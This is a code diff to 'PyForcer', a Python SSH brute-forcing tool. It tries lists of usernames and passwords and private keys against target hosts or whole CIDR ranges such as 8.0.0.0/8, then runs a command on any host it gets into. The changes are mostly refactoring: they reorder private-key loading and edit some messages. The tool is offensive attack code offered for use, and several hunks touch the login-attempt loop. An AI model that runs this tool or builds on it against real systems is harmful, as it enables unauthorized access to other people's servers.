@@ -43,26 +43,6 @@ def read_credentials_file(credentials_file):
                 counter += 1  
     return credentials, counter
 
-# def get_private_key(key_file, password=None):
-#     try:
-#         private_key = paramiko.RSAKey(filename=key_file, password=password)
-#         return "RSA", private_key
-#     except paramiko.PasswordRequiredException:
-#         pass  # Password is required, but not provided
-#     except paramiko.SSHException:
-#         try:
-#             private_key = paramiko.DSSKey(filename=key_file, password=password)
-#             return "DSA", private_key
-#         except paramiko.PasswordRequiredException:
-#             pass  # Password is required, but not provided
-#         except paramiko.SSHException:
-#             try:
-#                 private_key = paramiko.ECDSAKey(filename=key_file, password=password)
-#                 return "ECDSA", private_key
-#             except paramiko.PasswordRequiredException:
-#                 pass  # Password is required, but not provided
-#     sys.exit(f"File \"{key_file}\" is an invalid private key type, exiting.")
-    
 def get_private_key(key_file):
     try:
         private_key = paramiko.RSAKey(filename=key_file)
@@ -117,7 +97,6 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
     for username, password in credentials:
         try:
             ssh_client = paramiko.SSHClient()
-            #ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh_client.set_missing_host_key_policy(CustomAutoAddPolicy('SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2'))
             auth_method = None
 
@@ -166,7 +145,7 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
 def main():
     try:
         # Create a parser for command-line arguments
-        parser = argparse.ArgumentParser(description="PyForcere is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
+        parser = argparse.ArgumentParser(description="PyForcer  is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
         # Add arguments
         parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
         parser.add_argument("output", help="Path to the output file")
@@ -196,7 +175,7 @@ def main():
             ip_addresses = []
         if args.keyfile:
             if os.path.isfile(args.keyfile):
-                pass
+                private_key_type, private_key = get_private_key(args.keyfile)
             else:
                 sys.exit("Invalid input: specified keyfile does not exist!")
         if args.creds:
@@ -206,13 +185,10 @@ def main():
                 safe_print("ERROR: specified credentials file does not exist.")
                 return
         else:
-            credentials = []
-
-        if args.keyfile:
-            private_key_type, private_key = get_private_key(args.keyfile)
+            credentials = []           
 
         if not any(match in args.cmd for match in ["uname", "whoami"]):
-            safe_print(f"\n\n[WARN]: specified command has no extra verification, false positives are likely.\n\n")
+            safe_print(f"\n\n!!! WARNING !!! specified command has no extra verification, false positives are likely.\n\n")
 
         safe_print("PyForcer - SSH bruteforcing done properly.")
         safe_print(f"\tTarget(s): {args.input}")
